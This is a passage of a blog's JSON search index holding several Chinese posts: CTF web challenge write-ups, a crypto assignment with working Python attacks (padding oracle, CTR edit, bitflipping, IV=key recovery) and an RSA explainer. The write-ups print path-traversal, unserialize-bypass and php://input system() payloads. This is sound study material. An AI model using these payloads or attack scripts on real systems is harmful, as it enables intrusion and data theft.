\u0026#34;\u0026lt;br\u0026gt;\u0026lt;img src=\\\u0026#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\u0026#34; /\u0026gt;\u0026#34;; } 根据源代码得到提示，找到文件hint.php，得知flag在ffffllllaaaagggg这个文件里。再次进行代码审计,发现底下有个文件包包含，构造payload为： http://111.200.241.244:60683/source.php?file=source.php?./../../../../ffffllllaaaagggg 就可以得到flag。\nTraining-WWW-Robots 签到题，科普了一波robots.txt。\nPHP2 根据题目提示访问/index.phps获取提示信息：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php if(\u0026#34;admin\u0026#34;===$_GET[id]) {//如果id全等于admin则会被过滤 echo(\u0026#34;\u0026lt;p\u0026gt;not allowed!\u0026lt;/p\u0026gt;\u0026#34;); exit(); } $_GET[id] = urldecode($_GET[id]);//id进行一次url解码 if($_GET[id] == \u0026#34;admin\u0026#34;) { echo \u0026#34;\u0026lt;p\u0026gt;Access granted!\u0026lt;/p\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;p\u0026gt;Key: xxxxxxx \u0026lt;/p\u0026gt;\u0026#34;; } ?\u0026gt; Can you anthenticate to this website? 构造id=%2561dmin使之在被两次urldecode后等于admin就可获得flag。\nWeb_php_unserialize 又是一道反序列化的题。打开网页发现源代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;?php class Demo { private $file = \u0026#39;index.php\u0026#39;; public function __construct($file) { //构造函数，赋值给file $this-\u0026gt;file = $file; } function __destruct() { //析构函数 echo @highlight_file($this-\u0026gt;file, true); } function __wakeup() { if ($this-\u0026gt;file != \u0026#39;index.php\u0026#39;) { //the secret is in the fl4g.php $this-\u0026gt;file = \u0026#39;index.php\u0026#39;; } } } if (isset($_GET[\u0026#39;var\u0026#39;])) { $var = base64_decode($_GET[\u0026#39;var\u0026#39;]); if (preg_match(\u0026#39;/[oc]:\\d+:/i\u0026#39;, $var)) { // /i的意思是不区分大小写 die(\u0026#39;stop hacking!\u0026#39;); } else { @unserialize($var); } } else { highlight_file(\u0026#34;index.php\u0026#34;); } ?\u0026gt; 当Demo被反序列化时，wakeup函数中的内容会被执行，通过构造类中成员属性数目大于实际数目绕过。 var=O:4:\u0026quot;Demo\u0026quot;:2:{s:10:\u0026quot;\\0Demo\\0file\u0026quot;;s:8:\u0026quot;fl4g.php\u0026quot;;} 下面是对var变量的检查，用到了正则表达式，如果var符合开头o:数字的形式就会被过滤，这里采用+号过滤。 构造var=O:+4:\u0026quot;Demo\u0026quot;:2:{s:10:\u0026quot;\\0Demo\\0file\u0026quot;;s:8:\u0026quot;fl4g.php\u0026quot;;}，再进行一次base64加密，构造payload传参即可得到flag。 注意Demofile中的\\0，最好直接复制序列化之后的结果来改，不然特殊字符很容易出问题。\nphp_rce 打开以后发现是个Thinkphp V5的介绍页面，说明要利用Thinkphp框架的漏洞。查阅kali linux自带的漏洞数据库即可获得hack的方法。\n使用`searchsploit thinkphp``命令即可查询到可利用的漏洞。\n然后远程代码执行，找到flag文件。\nWeb_php_include 看题目应该是个文件包含。打开页面出一段代码。\n1 2 3 4 5 6 7 8 9 \u0026lt;?php show_source(__FILE__); echo $_GET[\u0026#39;hello\u0026#39;]; $page=$_GET[\u0026#39;page\u0026#39;]; while (strstr($page, \u0026#34;php://\u0026#34;)) { $page=str_replace(\u0026#34;php://\u0026#34;, \u0026#34;\u0026#34;, $page); } include($page); ?\u0026gt; 阅读代码发现，题目简单过滤了\u0026quot;php://\u0026ldquo;利用php大小写不敏感的特性，构造大写的pHp://绕过过滤。 使用php://input协议，远程执行代码：\n1 2 3 \u0026lt;?php system(\u0026#34;ls\u0026#34;); ?\u0026gt; 和\n1 2 3 \u0026lt;?php system(\u0026#34;cat fl4gisisish3r3.php\u0026#34;); ?\u0026gt; 获取flag。\nics-06 签到。Burpsuite暴力跑字典破解。。。\nNewsCenter 注意到网站使用的Sql数据库，使用Sqlmap工具hack。 sqlmap使用教程\nNaNNaNNaNNaN-Batman 下载到一段代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function $(){ var e=document.getElementById(\u0026#34;c\u0026#34;).value; if(e.length==16) if(e.match(/^be0f23/)!=null) if(e.match(/233ac/)!=null) if(e.match(/e98aa$/)!=null){ if(e.match(/c7be9/)!=null){ var t=[\u0026#34;fl\u0026#34;,\u0026#34;s_a\u0026#34;,\u0026#34;i\u0026#34;,\u0026#34;e}\u0026#34;]; var n=[\u0026#34;a\u0026#34;,\u0026#34;_h0l\u0026#34;,\u0026#34;n\u0026#34;]; var r=[\u0026#34;g{\u0026#34;,\u0026#34;e\u0026#34;,\u0026#34;_0\u0026#34;]; var i=[\u0026#34;it\u0026#39;\u0026#34;,\u0026#34;_\u0026#34;,\u0026#34;n\u0026#34;]; var s=[t,n,r,i]; for(var o=0;o\u0026lt;13;++o){ document.write(s[o%4][0]);s[o%4].splice(0,1) } } } } js正则表达式审计，但其实可以直接把前面判断的代码删掉，再跑一下生成flag的那段获取flag。\nunserialize3 又一道反序列化，打开页面得到代码：\n1 2 3 4 5 6 class xctf{ public $flag = \u0026#39;111\u0026#39;; public function __wakeup(){ exit(\u0026#39;bad requests\u0026#39;); } ?code= 这题和上道反序列化题相比完全是两个级别，直接将给的代码反序列化后，绕过wake_up即可得到flag。\n","permalink":"http://localhost:1313/articles/XCTF-WEB-1/","summary":"baby_web 进去之后发现是/1.php,根据提示“初始页面”，用burpsuite截获index.php，获得flag。 知识点：网页初始页面的文件名一","title":"攻防世界web前11题WP"},{"content":"$$ Hello World! $$\n","permalink":"http://localhost:1313/articles/hello-world/","summary":"$$ Hello World! $$","title":"HelloWorld"},{"content":"\u003c!DOCTYPE html\u003e 现代密码学 大作业 1 - zeroy的网络小窝 zeroy的网络小窝 文章 分类 关于 zeroy的网络小窝 取消 文章分类关于 现代密码学 大作业 1 zeroy \u0026nbsp;收录于 \u0026nbsp;类别 现代密码学 \u0026nbsp;2023-10-05\u0026nbsp;\u0026nbsp;2023-10-05\u0026nbsp;\u0026nbsp;约 2363 字\u0026nbsp; \u0026nbsp;预计阅读 5 分钟\u0026nbsp; 目录 CBC Padding Oracle 适用条件 攻击过程 特殊情况 代码 Break \u0026ldquo;random access read/write\u0026rdquo; AES CTR 适用条件 攻击过程 代码 CTR bitflipping 适用场景 场景流程 攻击流程 代码（CBC） 代码（CTR） Recover the key from CBC with IV=Key 前提条件 攻击流程 代码 CBC Padding Oracle 适用条件 已知iv 使用PKCS7来Padding 解密时检测到Padding错误会有回显 攻击过程首先回顾CBC的解密过程：\n不难发现，当我们可以控制当前Block的上一个Ciphertext时，有以下式子：\n1 plaintext_block = AES_DEC(ciphertext_block) XOR user_controlled_value 又由于plaintext_block合法时末尾仅可能为：\n1 2 3 4 5 6 01 02 02 03 03 03 04 04 04 04 05 05 05 05 05 ... 因此，可以采用逐位试探的方法，从低位到高位，调整user_controlled_value，使得plaintext_block通过PKCS7校验。\n然后，对于当前这位，假设目前试到了01，那么有：\n1 2 3 01 = AES_DEC(ciphertext_block) XOR user_controlled_bytes =\u0026gt; real_plaintext_block = AES_DEC(ciphertext_block) XOR user_controlled_bytes XOR user_controlled_bytes XOR real_iv = 01 XOR user_controlled_bytes XOR real_iv 其它位以此类推即可。\n特殊情况需要注意的是，还可能存在特殊情况，假设在试01的时候，这串字符串的后三位是这样的：\n1 04 04 04 ? 那么这位数最后解密的结果为01和04都能够通过PKCS7校验。遇到这种情况就要一个个试，假设是01或者04，再往后找一位，如果后一位能找到合法解，就采用当前解。\n代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 from utils import * from random import randint from Crypto import Random from Crypto.Cipher.AES import block_size, key_size from base64 import b64decode strings = [ \u0026#34;MDAwMDAwTm93IHRoYXQgdGhlIHBhcnR5IGlzIGp1bXBpbmc=\u0026#34;, \u0026#34;MDAwMDAxV2l0aCB0aGUgYmFzcyBraWNrZWQgaW4gYW5kIHRoZSBWZWdhJ3MgYXJlIHB1bXBpbic=\u0026#34;, \u0026#34;MDAwMDAyUXVpY2sgdG8gdGhlIHBvaW50LCB0byB0aGUgcG9pbnQsIG5vIGZha2luZw==\u0026#34;, \u0026#34;MDAwMDAzQ29va2luZyBNQydzIGxpa2UgYSBwb3VuZCBvZiBiYWNvbg==\u0026#34;, \u0026#34;MDAwMDA0QnVybmluZyAnZW0sIGlmIHlvdSBhaW4ndCBxdWljayBhbmQgbmltYmxl\u0026#34;, \u0026#34;MDAwMDA1SSBnbyBjcmF6eSB3aGVuIEkgaGVhciBhIGN5bWJhbA==\u0026#34;, \u0026#34;MDAwMDA2QW5kIGEgaGlnaCBoYXQgd2l0aCBhIHNvdXBlZCB1cCB0ZW1wbw==\u0026#34;, \u0026#34;MDAwMDA3SSdtIG9uIGEgcm9sbCwgaXQncyB0aW1lIHRvIGdvIHNvbG8=\u0026#34;, \u0026#34;MDAwMDA4b2xsaW4nIGluIG15IGZpdmUgcG9pbnQgb2g=\u0026#34;, \u0026#34;MDAwMDA5aXRoIG15IHJhZy10b3AgZG93biBzbyBteSBoYWlyIGNhbiBibG93\u0026#34;, ] class Oracle: def __init__(self, possible_inputs): self.iv = Random.new().read(block_size) self._key = Random.new().read(key_size[0]) self._possible_inputs = possible_inputs def get_encrypted_message(self): chosen_input = self._possible_inputs[randint(0, len(self._possible_inputs) - 1)].encode() return aes_cbc_encrypt(chosen_input, self._key, self.iv) def decrypt_and_check_padding(self, ciphertext, iv): plaintext = aes_cbc_decrypt(ciphertext, self._key, iv, False) return is_pkcs7_padded(plaintext) def create_forced_previous_block(iv, guessed_byte, padding_len, found_plaintext): index_of_forced_char = len(iv) - padding_len forced_character = iv[index_of_forced_char] ^ guessed_byte ^ padding_len output = iv[:index_of_forced_char] + bytes([forced_character]) m = 0 for k in range(block_size - padding_len + 1, block_size): forced_character = iv[k] ^ found_plaintext[m] ^ padding_len output += bytes([forced_character]) m += 1 return output def attack_padding_oracle(ciphertext, oracle): plaintext = b\u0026#39;\u0026#39; ciphertext_blocks = [oracle.iv] + [ciphertext[i:i + block_size] for i in range(0, len(ciphertext), block_size)] for c in range(1, len(ciphertext_blocks)): plaintext_block = b\u0026#39;\u0026#39; for i in range(block_size - 1, -1, -1): padding_len = len(plaintext_block) + 1 possible_last_bytes = [] for j in range(256): forced_iv = create_forced_previous_block(ciphertext_blocks[c - 1], j, padding_len, plaintext_block) if oracle.decrypt_and_check_padding(ciphertext_blocks[c], forced_iv) is True: possible_last_bytes += bytes([j]) if len(possible_last_bytes) != 1: for byte in possible_last_bytes: for j in range(256): forced_iv = create_forced_previous_block(ciphertext_blocks[c - 1], j, padding_len + 1, bytes([byte]) + plaintext_block) if oracle.decrypt_and_check_padding(ciphertext_blocks[c], forced_iv) is True: possible_last_bytes = [byte] break plaintext_block = bytes([possible_last_bytes[0]]) + plaintext_block plaintext += plaintext_block return pkcs7_unpad(plaintext) def main(): for string in strings: oracle = Oracle([string]) result = attack_padding_oracle(oracle.get_encrypted_message(), oracle) print(b64decode(result.decode())) if __name__ == \u0026#39;__main__\u0026#39;: main() Break \u0026ldquo;random access read/write\u0026rdquo; AES CTR 适用条件由于CTR模式的特性，导致CTR模式的加解密算法是相同的，同时，CTR模式是可并行化处理的，也就意味着CTR模式可以访问其中任意一个块进行加密或者解密。\n多次的加密解密 攻击过程核心：将Ciphertext再跑一遍算法，得到的就是Plaintext。\n注意使用offset计算首块和尾块的处理细节。\n代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 from base64 import b64decode from utils import * from Crypto import Random from Crypto.Cipher import AES class Oracle: def __init__(self) -\u0026gt; None: self._key = Random.new().read(AES.key_size[0]) def encrypt(self, plaintext): return aes_ctr(plaintext, self._key, 0) def edit(self, ciphertext, offset, new_text): start_block = int(offset / AES.block_size) end_block = int((offset + len(new_text) - 1) / AES.block_size) keystream = b\u0026#39;\u0026#39; cipher = AES.new(self._key, AES.MODE_ECB) for block in range(start_block, end_block + 1): keystream += cipher.encrypt(struct.pack(\u0026#39;\u0026lt;QQ\u0026#39;, 0, block)) key_offset = offset % AES.block_size keystream = keystream[key_offset:key_offset + len(new_text)] insert = xor_data(new_text, keystream) return ciphertext[:offset] + insert + ciphertext[offset + len(insert):] def break_random_access_read_write_aes_ctr(ciphertext, encryption_oracle): return encryption_oracle.edit(ciphertext, 0, ciphertext) def main(): with open(\u0026#34;25.txt\u0026#34;) as input_file: binary_data = b64decode(input_file.read()) plaintext = aes_ecb_decrypt(binary_data, b\u0026#39;YELLOW SUBMARINE\u0026#39;) oracle = Oracle() ciphertext = oracle.encrypt(plaintext) cracked_plaintext = break_random_access_read_write_aes_ctr(ciphertext, oracle) assert plaintext == cracked_plaintext print(cracked_plaintext.decode().rstrip()) if __name__ == \u0026#34;__main__\u0026#34;: main() CTR bitflipping它的前身是CBC bitflipping，会CBC bitflipping，自然会这个，所以下面先讲CBC bitflipping。\n适用场景改变字符串中的特定字符。\n场景流程生成随机 AES 密钥。\n将填充代码和 CBC 代码结合起来编写两个函数。\n第一个函数应该接受任意输入字符串，并在字符串前面添加：\n1 comment1=cooking%20MCs;userdata= 后面添加：\n1 ;comment2=%20like%20a%20pound%20of%20bacon 该函数应该去除“;” 和“=”字符。\n然后，该函数应将输入填充为 16 字节 AES 块长度，并使用随机 AES 密钥对其进行加密。\n第二个函数应该解密字符串并查找字符“;admin=true;” 。\n根据字符串是否存在返回 true 或 false。\n攻击流程攻击的关键在于，插入的字符串中不能含有\u0026quot;;\u0026ldquo;和\u0026rdquo;=\u0026quot;，因此只能想办法绕过。\n方法是，先将\u0026quot;?admin?true\u0026quot;加密，由于我们可以控制iv，并且已知明文为\u0026quot;?\u0026quot;，那么只需要将\n1 iv XOR \u0026#34;?\u0026#34; XOR \u0026#34;?\u0026#34;/\u0026#34;=\u0026#34; 就可以得到我们想要的解密结果。\n代码（CBC） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 from utils import aes_cbc_encrypt, aes_cbc_decrypt from Crypto import Random from Crypto.Cipher import AES class Oracle: def __init__(self): self._key = Random.new().read(AES.key_size[0]) self._iv = Random.new().read(AES.block_size) self._prefix = \u0026#34;comment1=cooking%20MCs;userdata=\u0026#34; self._suffix = \u0026#34;;comment2=%20like%20a%20pound%20of%20bacon\u0026#34; def encrypt(self, data): data = data.replace(\u0026#39;;\u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39;=\u0026#39;, \u0026#39;\u0026#39;) plaintext = (self._prefix + data + self._suffix).encode() return aes_cbc_encrypt(plaintext, self._key, self._iv) def decrypt_and_check_admin(self, ciphertext): data = aes_cbc_decrypt(ciphertext, self._key, self._iv) print(data) if b\u0026#39;;admin=true;\u0026#39; in data: print(\u0026#34;You have successfully logged in!\u0026#34;) else: print(\u0026#34;Something wrong!\u0026#34;) def cbc_bit_flip(encryption_oracle): block_length = 16 prefix_length = 32 additional_prefix_bytes = (block_length - (prefix_length % block_length)) % block_length total_prefix_length = prefix_length + additional_prefix_bytes plaintext = \u0026#34;?admin?true\u0026#34; additional_plaintext_bytes = (block_length - (len(plaintext) % block_length)) % block_length final_plaintext = additional_plaintext_bytes * \u0026#39;?\u0026#39; + plaintext ciphertext = encryption_oracle.encrypt(additional_prefix_bytes * \u0026#39;?\u0026#39; + final_plaintext) print(\u0026#34;ciphertext: \u0026#34;, ciphertext) semicolon = ciphertext[total_prefix_length - 11] ^ ord(\u0026#39;?\u0026#39;) ^ ord(\u0026#39;;\u0026#39;) equals = ciphertext[total_prefix_length - 5] ^ ord(\u0026#39;?\u0026#39;) ^ ord(\u0026#39;=\u0026#39;) forced_ciphertext = ciphertext[:total_prefix_length - 11] + bytes([semicolon]) + \\ ciphertext[total_prefix_length - 10: total_prefix_length - 5] + \\ bytes([equals]) + ciphertext[total_prefix_length - 4:] return forced_ciphertext def main(): encryption_oracle = Oracle() forced_ciphertext = cbc_bit_flip(encryption_oracle) encryption_oracle.decrypt_and_check_admin(forced_ciphertext) if __name__ == \u0026#39;__main__\u0026#39;: main() 代码（CTR） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 from utils import aes_ctr, xor_data from Crypto import Random from Crypto.Cipher import AES from random import randint class Oracle: def __init__(self): self._key = Random.new().read(AES.key_size[0]) self._nonce = randint(0, 2 ** 32 - 1) self._prefix = \u0026#34;comment1=cooking%20MCs;userdata=\u0026#34; self._suffix = \u0026#34;;comment2=%20like%20a%20pound%20of%20bacon\u0026#34; def encrypt(self, data): data = data.decode().replace(\u0026#39;;\u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39;=\u0026#39;, \u0026#39;\u0026#39;) plaintext = (self._prefix + data + self._suffix).encode() return aes_ctr(plaintext, self._key, self._nonce) def decrypt_and_check_admin(self, ciphertext): data = aes_ctr(ciphertext, self._key, self._nonce) print(data) if b\u0026#39;;admin=true;\u0026#39; in data: print(\u0026#34;You have successfully logged in!\u0026#34;) else: print(\u0026#34;Something wrong!\u0026#34;) def ctr_bit_flip(encryption_oracle): block_length = 16 prefix_length = 32 plaintext = b\u0026#34;?admin?true\u0026#34; ciphertext = encryption_oracle.encrypt(plaintext) goal_text = b\u0026#39;;admin=true\u0026#39; insert = xor_data(plaintext, goal_text) forced_ciphertext = ciphertext[:prefix_length] + \\ xor_data(ciphertext[prefix_length:prefix_length + len(plaintext)], insert) + \\ ciphertext[prefix_length + len(plaintext):] return forced_ciphertext def main(): encryption_oracle = Oracle() forced_ciphertext = ctr_bit_flip(encryption_oracle) encryption_oracle.decrypt_and_check_admin(forced_ciphertext) if __name__ == \u0026#39;__main__\u0026#39;: main() Recover the key from CBC with IV=Key参考链接\n前提条件 加密程序使用相同的IV和KEY 解密失败时，服务器抛出错误，并将解码的消息反映给攻击者 攻击流程 制作长度至少为3个块大小的明文 加密明文，得到密文 让密文的第二个块全0 让密文的第三个块和第一个块一样 解密该密文，得到认证失败的明文 将第一段得到的明文和第三段得到的明文XOR 得到KEY！ 1 2 3 4 first_block_ciphertext = AES_Decrypt(first_block_ciphertext, KEY) XOR KEY third_block_ciphertext = AES_Decrypt(first_block_ciphertext, KEY) XOR second_block_ciphertext =\u0026gt; KEY = AES_Decrypt(first_block_ciphertext, KEY) XOR KEY XOR AES_Decrypt(third_block_ciphertext, KEY) XOR second_block_ciphertext 代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 from utils import * from Crypto import Random class Oracle: def __init__(self): self._key = Random.new().read(AES.key_size[0]) self._iv = self._key self._prefix = \u0026#34;comment1=cooking%20MCs;userdata=\u0026#34; self._suffix = \u0026#34;;comment2=%20like%20a%20pound%20of%20bacon\u0026#34; def encrypt(self, data): data = data.replace(\u0026#39;;\u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39;=\u0026#39;, \u0026#39;\u0026#39;) plaintext = (self._prefix + data + self._suffix).encode() return aes_cbc_encrypt(plaintext, self._key, self._iv) def decrypt_and_check_admin(self, ciphertext): plaintext = aes_cbc_decrypt(ciphertext, self._key, self._iv) if not all(c \u0026lt; 128 for c in plaintext): raise Exception(\u0026#34;The message is not valid\u0026#34;, plaintext) if b\u0026#39;;admin=true;\u0026#39; in plaintext: print(\u0026#34;You have successfully logged in!\u0026#34;) else: print(\u0026#34;Something wrong!\u0026#34;) def get_key_from_insecure_cbc(encryption_oracle): block_length = 16 prefix_length = 32 p_1 = \u0026#39;A\u0026#39; * block_length p_2 = \u0026#39;B\u0026#39; * block_length p_3 = \u0026#39;C\u0026#39; * block_length ciphertext = encryption_oracle.encrypt(p_1 + p_2 + p_3) forced_ciphertext = ciphertext[prefix_length:prefix_length + block_length] + b\u0026#39;\\x00\u0026#39; * block_length + \\ ciphertext[prefix_length:prefix_length + block_length] try: encryption_oracle.decrypt_and_check_admin(forced_ciphertext) except Exception as e: forced_plaintext = e.args[1] return xor_data(forced_plaintext[:block_length], forced_plaintext[-block_length:]) raise Exception(\u0026#34;Was not able to hack the key\u0026#34;) def main(): encryption_oracle = Oracle() hacked_key = get_key_from_insecure_cbc(encryption_oracle) if encryption_oracle._key == hacked_key: print(\u0026#34;Hacked!\u0026#34;) else: print(\u0026#34;Something Wrong!\u0026#34;) assert encryption_oracle._key == hacked_key if __name__ == \u0026#39;__main__\u0026#39;: main() 更新于 2023-10-05 阅读原始文档 返回\u0026nbsp;|\u0026nbsp;主页 mysterytwisterc3-challenge-AES key — encoded in the machine readable zone of a European ePassport 由 Hugo 强力驱动\u0026nbsp;|\u0026nbsp;主题 - DoIt 2019 - 2023\u0026nbsp;zeroy\u0026nbsp;|\u0026nbsp;CC BY-NC 4.0 ","permalink":"http://localhost:1313/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%A4%A7%E4%BD%9C%E4%B8%9A-1-zeroy%E7%9A%84%E7%BD%91%E7%BB%9C%E5%B0%8F%E7%AA%9D/","summary":"\u003c!DOCTYPE html\u003e 现代密码学 大作业 1 - zeroy的网络小窝 zeroy的网络小窝 文章 分类 关于 zeroy的网络小窝 取消 文章分类关于 现代密码学 大作业 1 zeroy \u0026nbs","title":""},{"content":"前置知识：欧拉定理\n进阶知识：Miller Rabin算法（用于生成大素数），蒙哥马利算法（用于加快大数相乘再取模运算）\n引入 历史上常规的密码加解密算法的流程如下：\n假设甲要给乙发送数据，则需要甲通过一定的加密规则将数据加密，传送给乙，乙再通过一定的解密规则进行解密。\n由于可靠性高的密码算法都要公开自己的加解密算法，因此，在数据传输的过程中，密钥的传输成了一个大难题。\n因此RSA算法将密钥分为公钥和私钥两个部分，公钥任何人都可以获取到，而私钥只有数据接收方知道，接下来我们看看RSA加解密算法的运作流程。\n算法流程 选定两个素数\\(p\\),\\(q\\),令\\(n=pq,\\phi{(n)}=(p-1)(q-1)\\) 选取一个公钥\\(e\\)，满足\\(1\u0026lt;e\u0026lt;\\phi{(n)}\\)，且\\(e\\)与\\(\\phi{(n)}\\)互质 生成私钥 \\(d\\)，满足\\(ed\\equiv1(mod\\ \\phi{(n)})\\) 假设要发送的信息为\\(m\\)，则加解密规则成立： $$ m^e\\equiv c\\pmod{n}\\ c^d\\equiv m\\pmod{n} $$\n可靠性分析 考虑甲向乙发送一串数据，乙只需要向甲传送\\(n\\)和\\(e\\),甲就可以将加密完成的\\(c\\)发还给乙，由乙来进行解密操作。\n考虑第三方攻击者，只可能截获\\(n\\),\\(e\\),\\(c\\)，若要获取私钥\\(d\\)，则必须计算得\\(n\\)分解成的\\(p\\),\\(q\\)两数。\n而大质数的因式分解所需要的运算量是非常恐怖的。因此，当选定的\\(n\\)很大时，RSA算法几乎不可能被破解。\n总而言之：RSA利用的是，大数容易相乘，难以分解的特性，使得算法可靠。\n代码实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 #RSA加解密算法实现 @copyright zeroy p=1000000007 q=998244353 n=p*q phi_n=(p-1)*(q-1) E=65537 def qkpow(a,b): ans=1 while b\u0026gt;0: if b%2==1: ans=ans*a%n a=a*a%n b=b//2 return ans def exgcd(a,b): if b==0: return 1,0,a else: x,y,q=exgcd(b,a%b) x,y=y,(x-(a//b)*y) return x,y,q # E**D=1(mod phi_n) def calcD(): x,y,q=exgcd(E,phi_n) return x+phi_n D=calcD() # C=m**E%n def encode(m): c=qkpow(m,E) return c # ans=c**D%n def decode(c): return qkpow(c,D) def main(): c=encode(234234) ans=decode(c) print(ans) main() 正确性证明 RSA算法过程以及正确性证明 - 简书 (jianshu.com)\n拓展知识 我们已经知道了RSA算法的流程，也知道了它的正确性，但是还有几个问题需要解决。\n既然大数分解十分困难，那我们该如何寻找两个大质数来作为\\(p\\),\\(q\\)呢？ 加解密运算中涉及到了大量的大数乘法取模，这是运算复杂度最高的部分，有没有一种方法可以优化\\(AB\\equiv C(mod\\ N)\\)运算的速度从而优化密钥生成的速度？ 方法是有的。可以采用Miller Rabin算法来对生成的大数进行质数检验，用蒙哥马利算法来优化大数相乘的复杂度，不过这不属于本文的主题，感兴趣的师傅可以自行了解。\n","permalink":"http://localhost:1313/rsa%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3/","summary":"前置知识：欧拉定理 进阶知识：Miller Rabin算法（用于生成大素数），蒙哥马利算法（用于加快大数相乘再取模运算） 引入 历史上常规的密码加解","title":""}]